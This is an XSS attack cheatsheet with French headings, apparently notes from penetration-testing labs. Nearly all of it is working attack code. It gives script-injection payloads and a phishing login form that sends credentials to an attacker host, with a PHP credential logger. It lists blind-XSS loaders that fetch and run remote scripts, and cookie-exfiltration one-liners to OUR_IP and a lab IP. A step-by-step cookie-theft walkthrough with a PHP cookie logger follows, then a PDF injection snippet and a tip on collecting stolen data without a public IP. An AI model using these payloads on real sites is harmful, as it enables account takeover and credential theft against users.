## Cross-Site Scripting (XSS) Cheatsheet

## Payloads de Base
```html
<script>alert(window.origin)</script>
<iframe src=file:///flag.txt></iframe>
```

## Outils : XssStrike
```bash
python xsstrike.py -u 'http://83.136.255.40:49597/?fullname=nhj&username=jhk&password=jl&email=lkl@gmail.com'
```

## Formulaire de Connexion Malveillant
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
### Exemple en JavaScript
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

## Serveur de Récupération des Identifiants (PHP)
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

## XSS Aveugle (Blind XSS)
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
<script>fetch('http://OUR_IP/exfil?cookie=' + btoa(document.cookie))</script>
```

## Exfiltration de Cookies
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

## Explication du Vol de Cookies
1. Trouver un payload fonctionnel.
2. Créer un fichier JavaScript :
```javascript
cat cookie.js
new Image().src='http://10.10.14.119:8000/cookie.php?c='+document.cookie;
```
1. Lancer un serveur Python dans le même dossier.
2. Créer un fichier PHP pour stocker les cookies :
```php
cat cookie.php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
3. Lancer un serveur PHP `php -S 0.0.0.0:8000`
4. Injecter le script :
```html
"><script src='http://10.10.14.119/cookie.js'></script> 
```

## Exploitation XSS via PDF
### Exemple de code injecté dans un PDF
```plaintext
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
     /O <<
        /F (\\\\10.10.14.8\\test)
      /D [ 0 /Fit]
      /S /GoToE
      >>
     >>
     /Parent 2 0 R
     /Resources <<
      /Font <<
        /F1 <<
          /Type /Font
          /Subtype /Type1
          /BaseFont /Helvetica
```

## Exfiltration sans IP Publique

- Utiliser `www.postb.in` pour recevoir les données sans IP publique.